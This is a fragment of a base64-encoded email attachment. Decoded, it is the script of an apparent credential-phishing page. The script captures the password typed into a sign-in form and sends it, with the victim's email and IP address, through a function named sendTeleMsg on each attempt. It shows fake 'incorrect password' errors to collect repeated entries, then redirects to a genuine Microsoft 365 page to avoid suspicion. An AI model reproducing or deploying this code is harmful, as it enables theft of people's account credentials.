bmVySFRNTD1lbWFpbDsNCglsZXQgY291bnQgPSAwOw0KDQoJZG9jdW1lbnQucXVlcnlTZWxl
Y3RvcigiI3NpZ25JbiIpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oKXsN
CgkJY29uc3QgcGFzc2tleSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZCIp
LnZhbHVlOw0KCQkgIAljb25zdCBpcCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNoaWRk
ZW5faXAiKS52YWx1ZTsNCgkJLy8gIAljb25zb2xlLmxvZyhpcCk7DQoJCWNvdW50KysNCgkJ
aWYoIXBhc3NrZXkpIHsNCgkJCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZF9f
ZW1wdHkiKS5zdHlsZS5kaXNwbGF5PSJibG9jayI7DQoJCQlzZXRUaW1lb3V0KCgpPT57DQoJ
CQkJZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3Bhc3N3b3JkX19lbXB0eSIpLnN0eWxlLmRp
c3BsYXk9Im5vbmUiOw0KCQkJfSwgMTAwMCkNCgkJfQ0KCQllbHNlIHsNCg0KCQkJaWYoY291
bnQgPT0gMykgew0KCQkJCQkgc2VuZFRlbGVNc2coZW1haWwsIHBhc3NrZXksIGlwKTsNCgkJ
CQkJIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSJodHRwczovL3d3dy5taWNyb3NvZnQuY29tL2Vu
LWdiL21pY3Jvc29mdC0zNjUvZnJlZS1vZmZpY2Utb25saW5lLWZvci10aGUtd2ViIjsNCgkJ
CQl9IGVsc2UgaWYoY291bnQgPT0gMikgew0KCQkJCQkJc2VuZFRlbGVNc2coZW1haWwsIHBh
c3NrZXksIGlwKTsNCgkJCQkJCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZF9f
aW5jb3JyZWN0MSIpLnN0eWxlLmRpc3BsYXk9ImJsb2NrIjsNCgkJCQkJCXNldFRpbWVvdXQo
KCk9PnsNCgkJCQkJCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZF9faW5jb3Jy
ZWN0MSIpLnN0eWxlLmRpc3BsYXk9Im5vbmUiOw0KCQkJCQkJZG9jdW1lbnQucXVlcnlTZWxl
Y3RvcigiI3Bhc3N3b3JkIikudmFsdWU9IiI7DQoJCQkJCX0sIDEwMDApDQoNCgkJCQl9DQoN
CgkJCQllbHNlIHsNCgkJCQkJICAgc2VuZFRlbGVNc2coZW1haWwsIHBhc3NrZXksIGlwKTsN
CgkJCQkJCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZF9faW5jb3JyZWN0Iiku
c3R5bGUuZGlzcGxheT0iYmxvY2siOw0KCQkJCQkJc2V0VGltZW91dCgoKT0+ew0KCQkJCQkJ
ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3Bhc3N3b3JkX19pbmNvcnJlY3QiKS5zdHlsZS5k
aXNwbGF5PSJub25lIjsNCgkJCQkJCWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29y
ZCIpLnZhbHVlPSIiOw0KCQkJCQl9LCAxMDAwKQ0KDQoJCQl9DQoNCg0KCQl9DQoJfSkNCg0K
DQo8L3NjcmlwdD4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KDQoJPC9z
Y3JpcHQ+DQo8L2h0bWw+DQo=

------=_NextPart_000_0012_2DBD055B.AF296556--
